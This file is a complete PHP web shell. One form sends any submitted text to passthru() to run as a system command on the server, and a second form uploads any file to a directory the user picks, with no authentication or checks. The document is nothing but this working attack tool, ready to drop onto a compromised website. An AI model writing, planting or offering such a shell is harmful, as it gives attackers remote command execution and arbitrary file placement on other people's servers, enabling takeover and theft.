<html>
<head></head>
<body>
    <div align="left">
        <font size="2">Input command : </font>
        <form name="cmd" method="post" enctype="multipart/form-data">
            <input type="text" name="cmd" size="30" class="input"><br>
            <pre>
            <?php
            if($_POST['cmd'])
            {
                $cmd = $_POST['cmd'];
                passthru($cmd);
            }
            ?>
            </pre>
        </form>
    </div>
    <hr>
    <div align="left">
            <font size="2">Uploader File : </font>
            <form name="forml" method="post" enctype="multipart/form-data">
                <input type="text" name="dir" size="30" value="<? passthru("pwd"); ?>">
                <input type="submit" name="submit2" value="upload">
                <input type="file" name="file" size="15">
                <pre>
                <?php
                $uploaded = $_FILES['file']['tmp_name'];
                if(file_exists($uploaded))
                {
                    $pwddir = $_POST['dir'];
                    $real = $_FILES['file']['name'];
                    $dez = $pwddir."/".$real;
                    copy($uploaded, $dez);
                    echo "FILE UPLOADED TO $dez";
                }
                ?>
                </pre>
            </form>
    </div>
    
</body>
</html>